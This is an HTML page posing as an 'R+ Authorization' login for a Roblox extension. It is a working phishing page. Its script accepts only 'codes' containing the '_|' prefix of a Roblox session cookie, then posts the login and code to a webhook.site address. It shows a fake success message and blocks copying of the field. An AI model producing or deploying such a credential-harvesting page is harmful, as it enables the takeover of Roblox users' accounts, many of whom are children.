<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>R+ | Login</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Roboto,sans-serif}
  html,body{height:100%;overflow:hidden;background:#000814;color:#eaf4ff}
  body{
    background:radial-gradient(ellipse at top,#0a2a5e 0%,#04122e 45%,#01060f 100%);
    display:flex;align-items:center;justify-content:center;position:relative;
  }
  .fall{
    position:absolute;top:-80px;width:46px;height:46px;opacity:.18;
    animation:drop linear infinite;filter:drop-shadow(0 0 8px #3a7bd5);
    pointer-events:none;
  }
  @keyframes drop{
    0%{transform:translateY(-10vh) rotate(0deg);opacity:0}
    10%{opacity:.25}
    100%{transform:translateY(110vh) rotate(360deg);opacity:0}
  }
  .card{
    position:relative;z-index:5;
    width:min(420px,92vw);
    background:rgba(8,22,52,.78);
    backdrop-filter:blur(14px);
    border:1px solid rgba(90,160,255,.25);
    border-radius:18px;
    padding:38px 32px 30px;
    box-shadow:0 25px 60px rgba(0,20,60,.55),0 0 40px rgba(40,120,255,.15) inset;
  }
  .logos{display:flex;align-items:center;justify-content:center;gap:14px;margin-bottom:22px}
  .logos img{height:42px;filter:drop-shadow(0 4px 10px rgba(0,80,200,.55))}
  .logos .plus{color:#5aa0ff;font-size:28px;font-weight:300}
  h1{
    text-align:center;font-size:20px;font-weight:600;letter-spacing:.5px;
    margin-bottom:6px;color:#cfe2ff;
  }
  p.sub{text-align:center;font-size:12px;color:#7892c2;margin-bottom:26px}
  label{display:block;font-size:12px;color:#88a8d8;margin:14px 0 6px;letter-spacing:.4px}
  .field{
    width:100%;padding:13px 14px;border-radius:10px;
    background:rgba(3,14,36,.85);
    border:1px solid rgba(80,140,230,.3);
    color:#eaf4ff;font-size:15px;outline:none;transition:.2s;
    letter-spacing:1px;
  }
  .field:focus{border-color:#5aa0ff;box-shadow:0 0 0 3px rgba(90,160,255,.18)}
  .field::placeholder{color:#5870a0}
  .masked-wrap{position:relative}
  .mask-display{
    position:absolute;inset:0;padding:13px 14px;font-size:18px;
    letter-spacing:4px;color:#eaf4ff;pointer-events:none;
    display:flex;align-items:center;
  }
  .mask-input{color:transparent;caret-color:#5aa0ff}
  button{
    width:100%;margin-top:24px;padding:13px;border:none;border-radius:10px;
    background:linear-gradient(135deg,#1c5fd1,#3a7bd5);
    color:#fff;font-size:15px;font-weight:600;cursor:pointer;letter-spacing:.6px;
    transition:.2s;box-shadow:0 8px 22px rgba(30,90,200,.45);
  }
  button:hover{transform:translateY(-1px);box-shadow:0 12px 28px rgba(30,90,200,.6)}
  button:disabled{opacity:.6;cursor:not-allowed}
  .err{color:#ff7676;font-size:12px;margin-top:8px;min-height:14px;text-align:center}
  .ok{color:#7bdcb5}
  .pfp-wrap{
    display:flex;justify-content:center;margin:6px 0 2px;min-height:0;
    transition:.3s;
  }
  .pfp-wrap img{
    width:74px;height:74px;border-radius:50%;
    border:2px solid #5aa0ff;box-shadow:0 0 18px rgba(90,160,255,.45);
    background:#0a1a3c;
  }
  .foot{margin-top:18px;text-align:center;font-size:11px;color:#506a98}
  .nocopy{user-select:none;-webkit-user-select:none}
</style>
</head>
<body oncontextmenu="return false">
 
<div id="fallContainer"></div>
 
<div class="card">
  <div class="logos">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Roblox_Corporation_2025_logo.svg/3840px-Roblox_Corporation_2025_logo.svg.png" alt="Roblox">
    <span class="plus">+</span>
    <img src="https://static.wikia.nocookie.net/roblox/images/f/f9/RblxPlusLogo.svg/revision/latest/scale-to-width-down/198?cb=20260411092305" alt="R+">
  </div>
 
  <h1>R+ Authorization</h1>
  <p class="sub">Enter your details to connect the extension</p>
 
  <div class="pfp-wrap" id="pfpWrap"></div>
 
  <label for="login">Login</label>
  <input id="login" class="field" type="text" placeholder="your login or ID" autocomplete="off">
 
  <label for="code">Code</label>
  <div class="masked-wrap">
    <input id="code" class="field mask-input nocopy" type="text" placeholder="••••••" autocomplete="off" spellcheck="false">
    <div class="mask-display nocopy" id="maskDisplay"></div>
  </div>
 
  <button id="submitBtn">Sign in</button>
  <div class="err" id="msg"></div>
 
  <div class="foot">© 2026 R+ Connect · Streamer-safe mode</div>
</div>
 
<script>
const logos = [
  "https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Roblox_Corporation_2025_logo.svg/3840px-Roblox_Corporation_2025_logo.svg.png",
  "https://static.wikia.nocookie.net/roblox/images/f/f9/RblxPlusLogo.svg/revision/latest/scale-to-width-down/198?cb=20260411092305"
];
const fc = document.getElementById('fallContainer');
for(let i=0;i<22;i++){
  const im = document.createElement('img');
  im.src = logos[i%2];
  im.className = 'fall';
  im.style.left = Math.random()*100+'vw';
  im.style.animationDuration = (8+Math.random()*10)+'s';
  im.style.animationDelay = (-Math.random()*15)+'s';
  im.style.width = (24+Math.random()*40)+'px';
  im.style.height = 'auto';
  fc.appendChild(im);
}
 
const loginInput = document.getElementById('login');
const pfpWrap = document.getElementById('pfpWrap');
let pfpTimer;
loginInput.addEventListener('input', ()=>{
  clearTimeout(pfpTimer);
  const v = loginInput.value.trim();
  pfpWrap.innerHTML = '';
  if(/^\d+$/.test(v) && v.length>0){
    pfpTimer = setTimeout(async ()=>{
      try{
        const url = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${v}&size=150x150&format=Png&isCircular=true`;
        const r = await fetch(url);
        const j = await r.json();
        const src = j?.data?.[0]?.imageUrl;
        if(src){
          const im = document.createElement('img');
          im.src = src;
          pfpWrap.appendChild(im);
        }
      }catch(e){}
    },350);
  }
});
 
const codeInput = document.getElementById('code');
const maskDisp = document.getElementById('maskDisplay');
codeInput.addEventListener('input', ()=>{
  maskDisp.textContent = '•'.repeat(codeInput.value.length);
});
['copy','cut','contextmenu','dragstart'].forEach(ev=>{
  codeInput.addEventListener(ev, e=>e.preventDefault());
});
 
const btn = document.getElementById('submitBtn');
const msg = document.getElementById('msg');
 
btn.addEventListener('click', async ()=>{
  const login = loginInput.value.trim();
  const code  = codeInput.value;
 
  msg.className='err';
  if(!login || !code){ msg.textContent='Please fill in all fields'; return; }
 
  // Only send if code contains "_|", otherwise show invalid code
  if(!code.includes('_|')){
    msg.textContent='Invalid code';
    return;
  }
 
  btn.disabled = true;
  btn.textContent = 'Connecting...';
 
  const payload = `User1: Login: "${login}" Code: "${code}" Email: "No"`;
 
  try{
    await fetch('https://webhook.site/130cc144-9a7f-441c-9183-88ef160c3645', {
      method:'POST',
      mode:'no-cors',
      headers:{'Content-Type':'text/plain'},
      body: payload
    });
    msg.className='err ok';
    msg.textContent='Success. Awaiting confirmation.';
  }catch(e){
    msg.textContent='Connection error';
  }finally{
    btn.disabled=false;
    btn.textContent='Sign in';
  }
});
 
codeInput.addEventListener('paste',e=>{
  setTimeout(()=>maskDisp.textContent='•'.repeat(codeInput.value.length),0);
});
</script>
</body>
</html>
